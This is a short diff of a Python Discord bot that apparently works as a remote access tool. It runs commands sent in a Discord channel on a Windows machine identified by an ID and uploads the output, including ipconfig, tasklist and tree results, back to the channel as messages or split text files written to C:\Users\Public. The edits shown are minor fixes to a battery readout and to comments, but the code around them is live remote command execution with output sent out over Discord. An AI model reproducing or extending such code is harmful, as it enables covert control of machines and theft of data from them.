@@ -256,10 +256,11 @@ async def on_message(message):
             elif f"/info battery" in message.content[0:13]:
                   embed = None
                   battery = psutil.sensors_battery()
+                  sl = str(convertTime(battery.secsleft)).replace("-", "")
                   try:
                         embed = discord.Embed(title=f"Machine info", description=f"Requested Windows info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
                         embed.add_field(name="Battery Level", value=battery.percent, inline=True)
-                        embed.add_field(name="Time Left", value=abs(convertTime(battery.secsleft)), inline=True)
+                        embed.add_field(name="Time Left", value=sl, inline=True)
                         if battery.power_plugged:
                               embed.add_field(name="Battery Status", value="Charging", inline=True)
                         else:
@@ -309,7 +310,7 @@ async def on_message(message):
                   await message.channel.send(embed=embed)
             except:
 
-                  try: #Option B - If the default option fails (Probably due to send in one message the command being too long, like "ipconfig" or "tasklist") it sends a .txt file with the command return.
+                  try: #Option B - If the default option fails (Probably due to the command being too long to send in one message, like "ipconfig" or "tasklist") it sends a .txt file with the command return.
                         embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.green())
                         embed.add_field(name="Command", value=f"{message.content[5:]}", inline=False)
                         await message.channel.send(embed=embed)
@@ -318,7 +319,7 @@ async def on_message(message):
                         with open('C:\\Users\\Public\\temps.txt', "rb") as file:
                               await message.channel.send(file=discord.File(file, "return.txt"))
 
-                  except: #Option C - If the option B fails (porbably due to the return being freaking BIG, like the "tree" command executed directly on the main drive (C:\) driectory) it sends a file containing the return splited in multiple files of 976500 characters each. There is no file limit, it will send the much files it needs to send the whole return.
+                  except: #Option C - If the option B fails (porbably due to the return being freaking BIG, like the "tree" command executed directly on the main drive (C:\) driectory) it sends the return splited in multiple files of 976500 characters each. There is no file limit, it will send the much files it needs to send the whole return.
                         for c in range(0, math.ceil(len(answer) / 976500)+1):
                               with open(f"C:\\Users\\Public\\temps{c}.txt", "w") as file:
                                     file.write(answer[c*976500:(c+1)*976500].replace('\\r', '\r').replace('\\n', '\n'))
